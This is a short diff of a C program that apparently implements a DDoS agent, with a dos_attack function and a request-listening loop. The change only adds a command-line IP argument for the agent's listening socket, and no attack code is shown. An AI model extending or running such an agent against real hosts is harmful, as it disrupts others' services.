@@ -139,7 +139,7 @@ static int dos_attack(char *target_ip, int pkts)
     return 0;
 }
 
-int main(void)
+int main(int argc, char *argv[])
 {
     int sock;
     ddos_request_t req;
@@ -148,7 +148,14 @@ int main(void)
 
     char ip[INET_ADDRSTRLEN];
 
-    sock = create_socket(DDOS_AGENT_SRV_PORT, 0); 
+    if (argc != 2)
+    {
+	fprintf(stderr, "Specify ip address\n");
+	return -1;
+    }
+    sock = create_socket(argv[1], DDOS_AGENT_SRV_PORT, 0); 
+    if (sock < 0)
+	return 1;
 
 
     while (1)
